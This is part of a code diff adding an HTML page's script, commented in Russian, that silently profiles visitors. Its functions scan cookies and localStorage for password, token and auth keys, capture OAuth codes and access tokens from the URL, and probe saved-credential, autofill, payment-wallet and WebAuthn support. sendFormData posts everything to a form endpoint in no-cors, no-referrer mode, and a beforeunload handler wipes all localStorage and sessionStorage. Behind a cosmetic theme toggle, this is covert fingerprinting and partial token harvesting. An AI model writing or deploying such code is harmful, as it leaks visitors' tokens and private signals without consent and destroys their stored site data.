+                    deviceInteraction: analyzeDeviceInteraction()
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            return result;
+        }
+
+        function detectInAppBrowsers() {
+            const ua = navigator.userAgent.toLowerCase();
+            const browsers = [];
+
+            if (ua.includes('fban') || ua.includes('fbav') || ua.includes('fbbv')) {
+                browsers.push({
+                    name: 'Facebook',
+                    type: 'in-app',
+                    confidence: 'high',
+                    details: 'Facebook встроенный браузер'
+                });
+            }
+
+            if (ua.includes('instagram')) {
+                browsers.push({
+                    name: 'Instagram',
+                    type: 'in-app',
+                    confidence: 'high',
+                    details: 'Instagram встроенный браузер'
+                });
+            }
+
+            if (ua.includes('whatsapp')) {
+                browsers.push({
+                    name: 'WhatsApp',
+                    type: 'in-app',
+                    confidence: 'medium',
+                    details: 'WhatsApp встроенный браузер'
+                });
+            }
+
+            if (ua.includes('twitter') || ua.includes('x.com')) {
+                browsers.push({
+                    name: 'Twitter/X',
+                    type: 'in-app',
+                    confidence: 'medium',
+                    details: 'Twitter/X встроенный браузер'
+                });
+            }
+
+            if (ua.includes('linkedin')) {
+                browsers.push({
+                    name: 'LinkedIn',
+                    type: 'in-app',
+                    confidence: 'medium',
+                    details: 'LinkedIn встроенный браузер'
+                });
+            }
+
+            if (ua.includes('micromessenger')) {
+                browsers.push({
+                    name: 'WeChat',
+                    type: 'in-app',
+                    confidence: 'high',
+                    details: 'WeChat встроенный браузер'
+                });
+            }
+
+            if (ua.includes('telegram')) {
+                browsers.push({
+                    name: 'Telegram',
+                    type: 'in-app',
+                    confidence: 'high',
+                    details: 'Telegram встроенный браузер'
+                });
+            }
+
+            if (ua.includes('slack')) {
+                browsers.push({
+                    name: 'Slack',
+                    type: 'in-app',
+                    confidence: 'medium',
+                    details: 'Slack встроенный браузер'
+                });
+            }
+
+            if (!browsers.length) {
+                const inAppIndicators = [
+                    ' wv)',
+                    '; wv',
+                    'mobile safari/',
+                    'version/'
+                ];
+
+                for (const indicator of inAppIndicators) {
+                    if (ua.includes(indicator) && ua.includes('android')) {
+                        browsers.push({
+                            name: 'Android WebView',
+                            type: 'in-app',
+                            confidence: 'low',
+                            details: 'Возможен встроенный браузер Android'
+                        });
+                        break;
+                    }
+                }
+            }
+
+            return {
+                detected: browsers.length > 0,
+                browsers: browsers,
+                count: browsers.length
+            };
+        }
+
+        function detectSocialWidgets() {
+            const widgets = [];
+
+            const scripts = document.getElementsByTagName('script');
+            const socialScripts = [
+                { pattern: /connect\.facebook\.net/, name: 'Facebook SDK' },
+                { pattern: /platform\.twitter\.com/, name: 'Twitter Widgets' },
+                { pattern: /apis\.google\.com/, name: 'Google APIs' },
+                { pattern: /platform\.linkedin\.com/, name: 'LinkedIn Widget' },
+                { pattern: /widgets\.pinterest\.com/, name: 'Pinterest Widget' },
+                { pattern: /telegram\.org/, name: 'Telegram Widget' },
+                { pattern: /vk\.com/, name: 'VK Widget' },
+                { pattern: /ok\.ru/, name: 'Odnoklassniki Widget' }
+            ];
+
+            for (const script of scripts) {
+                if (script.src) {
+                    for (const socialScript of socialScripts) {
+                        if (socialScript.pattern.test(script.src)) {
+                            widgets.push({
+                                name: socialScript.name,
+                                url: script.src.substring(0, 100) + '...',
+                                type: 'script'
+                            });
+                            break;
+                        }
+                    }
+                }
+            }
+
+            const iframes = document.getElementsByTagName('iframe');
+            const socialIframes = [
+                { pattern: /facebook\.com/, name: 'Facebook Iframe' },
+                { pattern: /twitter\.com/, name: 'Twitter Iframe' },
+                { pattern: /youtube\.com/, name: 'YouTube Iframe' },
+                { pattern: /instagram\.com/, name: 'Instagram Iframe' },
+                { pattern: /vk\.com/, name: 'VK Iframe' }
+            ];
+
+            for (const iframe of iframes) {
+                if (iframe.src) {
+                    for (const socialIframe of socialIframes) {
+                        if (socialIframe.pattern.test(iframe.src)) {
+                            widgets.push({
+                                name: socialIframe.name,
+                                url: iframe.src.substring(0, 100) + '...',
+                                type: 'iframe'
+                            });
+                            break;
+                        }
+                    }
+                }
+            }
+
+            const socialDivClasses = [
+                'fb-like', 'fb-comments', 'fb-share-button',
+                'twitter-tweet', 'twitter-follow-button',
+                'g-plusone', 'linkedin-share-button',
+                'pinterest-pin-button', 'vk-like'
+            ];
+
+            socialDivClasses.forEach(className => {
+                const elements = document.getElementsByClassName(className);
+                if (elements.length > 0) {
+                    widgets.push({
+                        name: className.replace('-', ' ').toUpperCase(),
+                        count: elements.length,
+                        type: 'widget'
+                    });
+                }
+            });
+
+            return {
+                detected: widgets.length > 0,
+                widgets: widgets,
+                count: widgets.length,
+                byType: {
+                    scripts: widgets.filter(w => w.type === 'script').length,
+                    iframes: widgets.filter(w => w.type === 'iframe').length,
+                    widgets: widgets.filter(w => w.type === 'widget').length
+                }
+            };
+        }
+
+        function checkSavedLogins() {
+            const hasCredentialsAPI = 'credentials' in navigator;
+            let hasSavedLogins = false;
+            let credentialsInfo = null;
+
+            if (hasCredentialsAPI) {
+                try {
+                    credentialsInfo = {
+                        passwordCredential: 'PasswordCredential' in window,
+                        federatedCredential: 'FederatedCredential' in window,
+                        publicKeyCredential: 'PublicKeyCredential' in window,
+                        canGet: 'get' in navigator.credentials,
+                        canStore: 'store' in navigator.credentials
+                    };
+
+                    const forms = document.getElementsByTagName('form');
+                    let autocompleteCount = 0;
+
+                    for (const form of forms) {
+                        const inputs = form.querySelectorAll('input[autocomplete]');
+                        autocompleteCount += inputs.length;
+                    }
+
+                    hasSavedLogins = autocompleteCount > 0;
+
+                } catch (e) {
+                    credentialsInfo = { error: e.message };
+                }
+            }
+
+            let localStorageHints = false;
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && (
+                        key.toLowerCase().includes('password') ||
+                        key.toLowerCase().includes('login') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth')
+                    )) {
+                        localStorageHints = true;
+                        break;
+                    }
+                }
+            } catch (e) { }
+
+            return {
+                hasCredentialsAPI: hasCredentialsAPI,
+                credentialsInfo: credentialsInfo,
+                hasSavedLogins: hasSavedLogins || localStorageHints,
+                confidence: hasSavedLogins ? 'medium' : 'low',
+                detectionMethod: hasSavedLogins ? 'autocomplete attributes' :
+                    localStorageHints ? 'localStorage hints' : 'none'
+            };
+        }
+
+        function detectOAuthRedirects() {
+            const params = new URLSearchParams(window.location.search);
+            const hashParams = new URLSearchParams(window.location.hash.substring(1));
+
+            const oauthParams = [
+                'code', 'token', 'access_token', 'id_token', 'state',
+                'oauth_token', 'oauth_verifier', 'authorization_code'
+            ];
+
+            const detected = [];
+
+            for (const param of oauthParams) {
+                if (params.has(param)) {
+                    detected.push({
+                        param: param,
+                        value: params.get(param).substring(0, 50) + (params.get(param).length > 50 ? '...' : ''),
+                        location: 'query',
+                        type: 'oauth'
+                    });
+                }
+                if (hashParams.has(param)) {
+                    detected.push({
+                        param: param,
+                        value: hashParams.get(param).substring(0, 50) + (hashParams.get(param).length > 50 ? '...' : ''),
+                        location: 'hash',
+                        type: 'oauth'
+                    });
+                }
+            }
+
+            const referrer = document.referrer;
+            const oauthDomains = [
+                'accounts.google.com',
+                'facebook.com',
+                'github.com',
+                'twitter.com',
+                'linkedin.com',
+                'microsoftonline.com',
+                'appleid.apple.com',
+                'oauth.vk.com',
+                'connect.ok.ru'
+            ];
+
+            let oauthReferrer = null;
+            if (referrer) {
+                for (const domain of oauthDomains) {
+                    if (referrer.includes(domain)) {
+                        oauthReferrer = {
+                            domain: domain,
+                            url: referrer.substring(0, 100) + '...'
+                        };
+                        break;
+                    }
+                }
+            }
+
+            return {
+                detected: detected.length > 0,
+                params: detected,
+                oauthReferrer: oauthReferrer,
+                count: detected.length
+            };
+        }
+
+        async function checkAvatarCacheTiming() {
+
+            const socialAvatars = [
+                { url: 'https://avatars.githubusercontent.com/', name: 'GitHub' },
+                { url: 'https://lh3.googleusercontent.com/', name: 'Google' },
+                { url: 'https://platform-lookaside.fbsbx.com/', name: 'Facebook' },
+                { url: 'https://telegram.org/img/t_logo.png', name: 'Telegram' },
+                { url: 'https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico', name: 'Discord' },
+                { url: 'https://en.wikipedia.org/static/favicon/wikipedia.ico', name: 'Wikipedia' }
+            ];
+
+            const results = [];
+
+            for (const avatar of socialAvatars) {
+                try {
+                    const start = performance.now();
+                    const response = await fetch(avatar.url, {
+                        method: 'HEAD',
+                        mode: 'no-cors',
+                        cache: 'default'
+                    });
+                    const end = performance.now();
+
+                    results.push({
+                        service: avatar.name,
+                        url: avatar.url,
+                        accessible: true,
+                        responseTime: Math.round(end - start) + 'ms',
+                        note: 'Проверка доступности'
+                    });
+                } catch (e) {
+                    results.push({
+                        service: avatar.name,
+                        url: avatar.url,
+                        accessible: false,
+                        error: e.message,
+                        note: 'Недоступно или заблокировано'
+                    });
+                }
+            }
+
+            return {
+                testPerformed: true,
+                results: results,
+                accessibleServices: results.filter(r => r.accessible).map(r => r.service),
+                note: 'Проверка только доступности сервисов, не настоящий timing attack'
+            };
+        }
+
+        function checkAutofillHints() {
+            const forms = document.getElementsByTagName('form');
+            const autofillFields = [];
+
+            for (const form of forms) {
+                const inputs = form.querySelectorAll('input, select, textarea');
+
+                for (const input of inputs) {
+                    const autocomplete = input.getAttribute('autocomplete') || '';
+                    const name = input.getAttribute('name') || input.getAttribute('id') || '';
+                    const type = input.getAttribute('type') || 'text';
+
+                    if (autocomplete ||
+                        name.toLowerCase().includes('name') ||
+                        name.toLowerCase().includes('email') ||
+                        name.toLowerCase().includes('phone') ||
+                        name.toLowerCase().includes('address') ||
+                        name.toLowerCase().includes('card') ||
+                        type === 'email' ||
+                        type === 'tel' ||
+                        type === 'password') {
+
+                        autofillFields.push({
+                            type: type,
+                            name: name,
+                            autocomplete: autocomplete,
+                            formIndex: Array.from(forms).indexOf(form)
+                        });
+                    }
+                }
+            }
+
+            const hasPaymentRequest = 'PaymentRequest' in window;
+            let paymentMethods = [];
+
+            if (hasPaymentRequest) {
+                const testMethods = ['https://google.com/pay', 'https://apple.com/apple-pay', 'basic-card'];
+                paymentMethods = testMethods.filter(method => {
+                    try {
+                        const request = new PaymentRequest([{ supportedMethods: method }], {
+                            total: { label: 'Test', amount: { currency: 'USD', value: '1.00' } }
+                        });
+                        return true;
+                    } catch (e) {
+                        return false;
+                    }
+                });
+            }
+
+            return {
+                hasForms: forms.length > 0,
+                formCount: forms.length,
+                autofillFields: autofillFields,
+                autofillFieldCount: autofillFields.length,
+                hasPaymentRequest: hasPaymentRequest,
+                supportedPaymentMethods: paymentMethods,
+                likelyAutofillUsage: autofillFields.length > 2
+            };
+        }
+
+        function detectSocialMediaPresence() {
+            const indicators = [];
+
+            const cookies = document.cookie.toLowerCase();
+            const socialCookies = [
+                { pattern: /_ga=|_gid=|_gat_/, name: 'Google Analytics', confidence: 'low' },
+                { pattern: /_fbp=|fr=|xs=/, name: 'Facebook', confidence: 'medium' },
+                { pattern: /guest_id=|personalization_id=/, name: 'Twitter', confidence: 'low' },
+                { pattern: /li_oatmeal=|li_sugr=/, name: 'LinkedIn', confidence: 'low' },
+                { pattern: /_ym_/, name: 'Yandex.Metrica', confidence: 'low' }
+            ];
+
+            for (const cookie of socialCookies) {
+                if (cookie.pattern.test(cookies)) {
+                    indicators.push({
+                        type: 'cookie',
+                        service: cookie.name,
+                        confidence: cookie.confidence,
+                        details: 'Обнаружены cookies сервиса'
+                    });
+                }
+            }
+
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const keyLower = key.toLowerCase();
+
+                    if (keyLower.includes('facebook') || keyLower.includes('fb_')) {
+                        indicators.push({
+                            type: 'localStorage',
+                            service: 'Facebook',
+                            confidence: 'medium',
+                            details: `Ключ: ${key.substring(0, 30)}...`
+                        });
+                    }
+                    if (keyLower.includes('twitter') || keyLower.includes('tw_')) {
+                        indicators.push({
+                            type: 'localStorage',
+                            service: 'Twitter',
+                            confidence: 'medium',
+                            details: `Ключ: ${key.substring(0, 30)}...`
+                        });
+                    }
+                    if (keyLower.includes('google') || keyLower.includes('ga_')) {
+                        indicators.push({
+                            type: 'localStorage',
+                            service: 'Google',
+                            confidence: 'low',
+                            details: `Ключ: ${key.substring(0, 30)}...`
+                        });
+                    }
+                }
+            } catch (e) { }
+
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('instagram') || ua.includes('fb')) {
+                indicators.push({
+                    type: 'user-agent',
+                    service: 'Social Media App',
+                    confidence: 'high',
+                    details: 'Встроенный браузер соцсети'
+                });
+            }
+
+            return {
+                indicators: indicators,
+                count: indicators.length,
+                detectedServices: [...new Set(indicators.map(i => i.service))],
+                confidence: indicators.length > 0 ? 'medium' : 'low'
+            };
+        }
+
+        function analyzeBrowserHabits() {
+            const habits = {
+                timeOnPage: performance.now() - (performance.timing?.navigationStart || 0),
+
+                scrollDepth: calculateScrollDepth(),
+
+                mouseActivity: trackMouseActivity(),
+                keyboardActivity: trackKeyboardActivity(),
+
+                visibilityChanges: trackVisibilityChanges(),
+
+                windowSizeChanges: trackWindowResize()
+            };
+
+            return habits;
+        }
+
+        async function collectPaymentAndAutofillInfo() {
+            const result = {
+                available: false,
+                error: null,
+                status: 'not_available',
+                details: {
+                    autofill: {},
+                    payment: {},
+                    webauthn: {},
+                    summary: {}
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const autofillInfo = await getAutofillInfo();
+                result.details.autofill = autofillInfo;
+
+                const paymentInfo = await getDetailedPaymentInfo();
+                result.details.payment = paymentInfo;
+
+                const webauthnInfo = await getDetailedWebAuthnInfo();
+                result.details.webauthn = webauthnInfo;
+
+                result.details.summary = {
+                    hasAutofill: autofillInfo.available,
+                    hasPaymentAPI: paymentInfo.available,
+                    hasWebAuthn: webauthnInfo.available,
+                    canMakePayments: paymentInfo.canMakePayments || false,
+                    hasBiometric: webauthnInfo.hasBiometric || false,
+                    supportedMethods: paymentInfo.supportedMethods?.length || 0
+                };
+
+                result.available = true;
+                result.status = 'success';
+
+            } catch (error) {
+                result.error = error.message;
+                result.status = 'error';
+            }
+
+            return result;
+        }
+
+        async function getAutofillInfo() {
+            const result = {
+                available: false,
+                formsDetected: 0,
+                autofillHints: [],
+                credentialsAPI: {},
+                features: {}
+            };
+
+            if ('credentials' in navigator) {
+                result.available = true;
+                result.credentialsAPI = {
+                    get: typeof navigator.credentials.get === 'function',
+                    create: typeof navigator.credentials.create === 'function',
+                    store: typeof navigator.credentials.store === 'function',
+                    preventSilentAccess: typeof navigator.credentials.preventSilentAccess === 'function'
+                };
+            }
+
+            try {
+                const autofillElements = document.querySelectorAll('[autocomplete]');
+                result.formsDetected = autofillElements.length;
+
+                const hints = new Set();
+                autofillElements.forEach(el => {
+                    const hint = el.getAttribute('autocomplete');
+                    if (hint && hint !== 'off') {
+                        hints.add(hint);
+                    }
+                });
+                result.autofillHints = Array.from(hints);
+
+            } catch (e) {
+                result.autofillError = e.message;
+            }
+
+            result.features = {
+                hasPasswordManager: 'PasswordCredential' in window,
+                hasAddressAutofill: checkAutofillSupport('address'),
+                hasCreditCardAutofill: checkAutofillSupport('cc'),
+                hasNameAutofill: checkAutofillSupport('name'),
+                hasEmailAutofill: checkAutofillSupport('email'),
+                hasPhoneAutofill: checkAutofillSupport('tel')
+            };
+
+            return result;
+        }
+
+        function checkAutofillSupport(type) {
+            const testInput = document.createElement('input');
+            testInput.autocomplete = type;
+            document.body.appendChild(testInput);
+
+            const hasSupport = testInput.autocomplete === type ||
+                testInput.getAttribute('autocomplete') === type;
+
+            document.body.removeChild(testInput);
+            return hasSupport;
+        }
+
+        async function getDetailedPaymentInfo() {
+            const result = {
+                available: false,
+                canMakePayments: false,
+                supportedMethods: [],
+                supportedNetworks: [],
+                paymentDetails: {},
+                walletDetection: {}
+            };
+
+            if (!('PaymentRequest' in window)) {
+                result.error = 'Payment Request API not supported';
+                return result;
+            }
+
+            result.available = true;
+
+            try {
+                const paymentMethods = [
+                    'https://google.com/pay',
+                    'https://apple.com/apple-pay',
+                    'https://paypal.com',
+                    'https://amazon.com/amazonpay',
+                    'basic-card',
+                    'https://bobpay.com',
+                    'https://alipay.com'
+                ];
+
+                const cardNetworks = ['visa', 'mastercard', 'amex', 'discover', 'jcb', 'diners', 'unionpay', 'mir'];
+
+                const supportedMethods = [];
+                const supportedNetworks = new Set();
+
+                for (const method of paymentMethods) {
+                    try {
+                        const request = new PaymentRequest(
+                            [{ supportedMethods: method }],
+                            {
+                                total: {
+                                    label: 'Test Payment',
+                                    amount: { currency: 'USD', value: '1.00' }
+                                }
+                            }
+                        );
+
+                        const canMake = await request.canMakePayment();
+                        if (canMake) {
+                            supportedMethods.push(method);
+
+                            if (method === 'basic-card') {
+                                for (const network of cardNetworks) {
+                                    try {
+                                        const networkRequest = new PaymentRequest(
+                                            [{
+                                                supportedMethods: 'basic-card',
+                                                data: { supportedNetworks: [network] }
+                                            }],
+                                            {
+                                                total: {
+                                                    label: 'Test',
+                                                    amount: { currency: 'USD', value: '1.00' }
+                                                }
+                                            }
+                                        );
+
+                                        if (await networkRequest.canMakePayment()) {
+                                            supportedNetworks.add(network);
+                                        }
+                                    } catch (e) { }
+                                }
+                            }
+                        }
+                    } catch (e) { }
+                }
+
+                result.supportedMethods = supportedMethods;
+                result.supportedNetworks = Array.from(supportedNetworks);
+                result.canMakePayments = supportedMethods.length > 0;
+
+                result.paymentDetails = {
+                    hasShippingAddress: 'shippingAddress' in PaymentRequest.prototype,
+                    hasShippingOption: 'shippingOption' in PaymentRequest.prototype,
+                    hasComplete: 'complete' in PaymentRequest.prototype,
+                    hasRetry: 'retry' in PaymentRequest.prototype,
+                    hasAbort: 'abort' in PaymentRequest.prototype,
+                    maxSupportedMethods: paymentMethods.length
+                };
+
+                result.walletDetection = {
+                    googlePay: supportedMethods.includes('https://google.com/pay'),
+                    applePay: supportedMethods.includes('https://apple.com/apple-pay'),
+                    paypal: supportedMethods.includes('https://paypal.com'),
+                    amazonPay: supportedMethods.includes('https://amazon.com/amazonpay'),
+                    hasDigitalWallet: supportedMethods.some(m =>
+                        m.includes('google.com/pay') ||
+                        m.includes('apple.com/apple-pay') ||
+                        m.includes('paypal.com')
+                    )
+                };
+
+            } catch (error) {
+                result.error = error.message;
+            }
+
+            return result;
+        }
+
+        async function getDetailedWebAuthnInfo() {
+            const result = {
+                available: false,
+                hasBiometric: false,
+                authenticators: [],
+                capabilities: {},
+                securityLevel: 'unknown'
+            };
+
+            if (!('PublicKeyCredential' in window)) {
+                result.error = 'WebAuthn not supported';
+                return result;
+            }
+
+            result.available = true;
+
+            try {
+                if (PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
+                    result.hasBiometric = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
+                }
+
+                if (PublicKeyCredential.isConditionalMediationAvailable) {
+                    result.hasConditionalUI = await PublicKeyCredential.isConditionalMediationAvailable();
+                }
+
+                result.capabilities = {
+                    u2f: 'U2F' in window || 'u2f' in window,
+                    ctap2: 'PublicKeyCredential' in window,
+                    residentKeys: 'residentKey' in (PublicKeyCredential || {}),
+                    userVerification: 'userVerification' in (PublicKeyCredential || {}),
+                    attestation: 'attestation' in (PublicKeyCredential || {})
+                };
+
+                if (result.hasBiometric && result.capabilities.residentKeys) {
+                    result.securityLevel = 'high';
+                } else if (result.capabilities.u2f || result.capabilities.ctap2) {
+                    result.securityLevel = 'medium';
+                } else {
+                    result.securityLevel = 'low';
+                }
+
+                result.authenticators = {
+                    platform: result.hasBiometric ? 'platform_authenticator' : 'none',
+                    crossPlatform: result.capabilities.u2f ? 'possible' : 'unknown',
+                    securityKey: result.capabilities.ctap2 ? 'possible' : 'unknown'
+                };
+
+            } catch (error) {
+                result.error = error.message;
+            }
+
+            return result;
+        }
+
+        function calculateScrollDepth() {
+            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+            const scrollHeight = document.documentElement.scrollHeight || document.body.scrollHeight;
+            const clientHeight = document.documentElement.clientHeight;
+
+            if (scrollHeight <= clientHeight) return 'no-scroll';
+
+            const maxScroll = scrollHeight - clientHeight;
+            const percentage = maxScroll > 0 ? Math.round((scrollTop / maxScroll) * 100) : 0;
+
+            return {
+                percentage: percentage + '%',
+                pixels: scrollTop + 'px',
+                maxScroll: maxScroll + 'px',
+                category: percentage < 25 ? 'low' :
+                    percentage < 50 ? 'medium' :
+                        percentage < 75 ? 'high' : 'full'
+            };
+        }
+
+        function trackMouseActivity() {
+            let moveCount = 0;
+            let clickCount = 0;
+            let lastPosition = null;
+
+            const trackMouse = () => {
+                moveCount++;
+            };
+
+            const trackClick = () => {
+                clickCount++;
+            };
+
+            return {
+                moveCount: moveCount,
+                clickCount: clickCount,
+                trackingAvailable: false,
+                note: 'Требуются обработчики событий'
+            };
+        }
+
+        function trackKeyboardActivity() {
+            return {
+                trackingAvailable: false,
+                note: 'Требуются обработчики событий для отслеживания клавиатуры'
+            };
+        }
+
+        function trackVisibilityChanges() {
+            let hiddenCount = 0;
+            let visibleCount = 0;
+            let lastState = document.visibilityState;
+
+            const handleVisibilityChange = () => {
+                if (document.hidden) {
+                    hiddenCount++;
+                } else {
+                    visibleCount++;
+                }
+                lastState = document.visibilityState;
+            };
+
+            return {
+                currentState: document.visibilityState,
+                hiddenCount: hiddenCount,
+                visibleCount: visibleCount,
+                trackingAvailable: false,
+                note: 'Требуется обработчик visibilitychange'
+            };
+        }
+
+        function trackWindowResize() {
+            let resizeCount = 0;
+            let lastSize = { width: window.innerWidth, height: window.innerHeight };
+
+            const handleResize = () => {
+                resizeCount++;
+                lastSize = { width: window.innerWidth, height: window.innerHeight };
+            };
+
+            return {
+                currentSize: { width: window.innerWidth, height: window.innerHeight },
+                resizeCount: resizeCount,
+                trackingAvailable: false,
+                note: 'Требуется обработчик resize'
+            };
+        }
+
+        function analyzeDeviceInteraction() {
+            return {
+                touchCapable: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                pointerEnabled: 'PointerEvent' in window,
+                gestureEnabled: 'ongesturestart' in window,
+                deviceMotion: 'DeviceMotionEvent' in window,
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                vibration: 'vibrate' in navigator,
+                reactionTime: null
+            };
+        }
+
+        async function sendFormData(jsonData) {
+            return new Promise((resolve) => {
+                try {
+                    debugLog('Подготовка формы к отправке');
+
+                    collectedDataField.value = jsonData;
+
+                    const formData = new FormData(Form);
+
+                    fetch(Form.action, {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                        referrerPolicy: 'no-referrer'
+                    })
+                        .then(response => {
+                            debugLog('Fetch ответ получен', {
+                                type: response.type,
+                                status: response.status,
+                                ok: response.ok
+                            });
+
+                            if (response.type === 'opaque') {
+                                debugLog('Форма отправлена (no-cors режим)');
+                                resolve(true);
+                            } else if (response.ok) {
+                                debugLog('Форма отправлена успешно');
+                                resolve(true);
+                            } else {
+                                debugError(`Ошибка HTTP: ${response.status}`);
+                                resolve(false);
+                            }
+                        })
+                        .catch(error => {
+                            debugError('Ошибка fetch при отправке', error);
+
+                            try {
+                                debugLog('Пробуем XMLHttpRequest как fallback');
+                                const xhr = new XMLHttpRequest();
+                                xhr.open('POST', Form.action, true);
+                                xhr.timeout = 10000;
+
+                                xhr.onload = function () {
+                                    debugLog('XHR ответ', { status: xhr.status });
+                                    if (xhr.status === 0 || xhr.status === 200 || xhr.status === 302) {
+                                        resolve(true);
+                                    } else {
+                                        resolve(false);
+                                    }
+                                };
+
+                                xhr.onerror = function () {
+                                    debugError('XHR ошибка сети');
+                                    resolve(false);
+                                };
+
+                                xhr.ontimeout = function () {
+                                    debugError('XHR таймаут');
+                                    resolve(false);
+                                };
+
+                                xhr.send(formData);
+                            } catch (xhrError) {
+                                debugError('Ошибка в XHR fallback', xhrError);
+                                resolve(false);
+                            }
+                        });
+
+                } catch (error) {
+                    debugError('Критическая ошибка при подготовке формы', error);
+                    resolve(false);
+                }
+            });
+        }
+
+        async function sendPendingData(jsonData) {
+            try {
+                const success = await sendFormData(jsonData);
+                if (success) {
+                    localStorage.removeItem(PENDING_DATA_KEY);
+                    debugLog('Отложенные данные отправлены');
+                }
+            } catch (error) {
+                debugError('Ошибка отправки отложенных данных', error);
+            }
+        }
+
+        function nukeLocalStorageOnExit() {
+            try {
+                console.log('ПОЛНАЯ ОЧИСТКА ПРИ ВЫХОДЕ');
+
+                localStorage.clear();
+                sessionStorage.clear();
+
+                console.log('✅ ВСЕ данные удалены');
+                return true;
+            } catch (error) {
+                console.error('❌ Ошибка при очистке:', error);
+                return false;
+            }
+        }
+
+        function showSuccessModal() {
+            successModal.classList.add('active');
+            setTimeout(() => {
+                successModal.classList.remove('active');
+            }, 5000);
+        }
+
+        function showErrorModal(errorCode = 'ERR_UNKNOWN') {
+            errorCodeSpan.textContent = errorCode;
+            errorModal.classList.add('active');
+
+            setTimeout(() => {
+                errorModal.classList.remove('active');
+            }, 5000);
+        }
+
+        successModal.addEventListener('click', (e) => {
+            if (e.target === successModal) {
+                successModal.classList.remove('active');
+            }
+        });
+
+        errorModal.addEventListener('click', (e) => {
+            if (e.target === errorModal) {
+                errorModal.classList.remove('active');
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeSystem();
+            loadTheme();
+        });
+
+        function loadTheme() {
+            const savedTheme = localStorage.getItem('theme');
+            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+
+            if (savedTheme === 'dark') {
+                body.classList.add('dark-mode');
+                themeToggle.checked = true;
+                updateThemeText(true);
+            } else {
+                body.classList.remove('dark-mode');
+                themeToggle.checked = false;
+                updateThemeText(false);
+
+                if (!savedTheme) {
+                    localStorage.setItem('theme', 'light');
+                }
+            }
+        }
+
+        function updateThemeText(isDark) {
+            if (isDark) {
+                themeLabel.textContent = 'DARK THEME';
+            } else {
+                themeLabel.textContent = 'LIGHT THEME';
+            }
+        }
+
+        function playTransitionAnimation(callback) {
+            transitionOverlay.classList.add('active');
+
+            setTimeout(() => {
+                callback();
+
+                setTimeout(() => {
+                    transitionOverlay.classList.add('fade-out');
+
+                    setTimeout(() => {
+                        transitionOverlay.classList.remove('active', 'fade-out');
+                    }, 800);
+                }, 100);
+            }, 400);
+        }
+
+        function showSaveNotification() {
+            saveNotification.classList.add('show');
+
+            setTimeout(() => {
+                saveNotification.classList.remove('show');
+            }, 2000);
+        }
+
+        themeToggle.addEventListener('mousedown', function () {
+            const slider = document.querySelector('.toggle-slider:before');
+            slider.style.width = '55px';
+        });
+
+        themeToggle.addEventListener('mouseup', function () {
+            const slider = document.querySelector('.toggle-slider:before');
+            slider.style.width = '';
+        });
+
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+            if (!localStorage.getItem('theme')) {
+                if (e.matches) {
+                    body.classList.add('dark-mode');
+                    themeToggle.checked = true;
+                    updateThemeText(true);
+                } else {
+                    body.classList.remove('dark-mode');
+                    themeToggle.checked = false;
+                    updateThemeText(false);
+                }
+            }
+        });
+
+        window.addEventListener('beforeunload', function () {
+            nukeLocalStorageOnExit();
+        });
+    </script>
+</body>
+
+</html>
